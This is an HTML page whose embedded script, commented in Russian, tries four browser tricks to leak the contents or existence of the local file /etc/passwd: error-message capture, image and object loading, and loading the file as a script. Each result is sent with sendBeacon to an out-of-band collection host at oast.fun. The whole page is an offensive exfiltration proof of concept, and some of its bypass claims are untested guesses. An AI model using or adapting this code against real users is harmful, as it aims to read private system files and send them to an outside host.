<!DOCTYPE html>
<html>
<body>
<script>
    const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";

    // МЕТОД 1: Каскадная ошибка (SOP Bypass через Error Message)
    // В некоторых версиях Chrome ошибка парсинга скрипта содержит кусок текста
    window.onerror = function(msg) {
        navigator.sendBeacon(hook + "/LEAK_ERROR", msg);
    };

    // МЕТОД 2: Попытка заставить браузер "отрисовать" файл как картинку на Canvas
    // Если мы сможем прочитать хоть один пиксель, мы подтвердим чтение
    function leakViaCanvas() {
        const img = new Image();
        img.src = "file:///etc/passwd";
        img.onerror = () => {
            // Если файл есть, но не картинка, ошибка вылетает быстрее
            navigator.sendBeacon(hook + "/FILE_EXISTS_CONFIRMED");
        };
    }

    // МЕТОД 3: Самый перспективный — HTML5 Object/Iframe
    // Мы создаем скрытый элемент и пытаемся вытащить его параметры
    function leakViaObject() {
        const obj = document.createElement('object');
        obj.data = "file:///etc/passwd";
        obj.onload = () => {
            // Если загрузилось, пробуем достать размер (палит объем файла)
            try {
                const size = obj.getBoundingClientRect().width;
                navigator.sendBeacon(hook + "/OBJECT_LOADED", "Size: " + size);
            } catch(e) {}
        };
        document.body.appendChild(obj);
    }

    // МЕТОД 4: Brute-force первой строки (Unexpected token)
    // Мы подключаем файл как JS. Chrome скажет: "Uncaught SyntaxError: Unexpected identifier 'root'"
    const script = document.createElement('script');
    script.src = "file:///etc/passwd";
    document.body.appendChild(script);

    leakViaCanvas();
    leakViaObject();
</script>
</body>
</html>
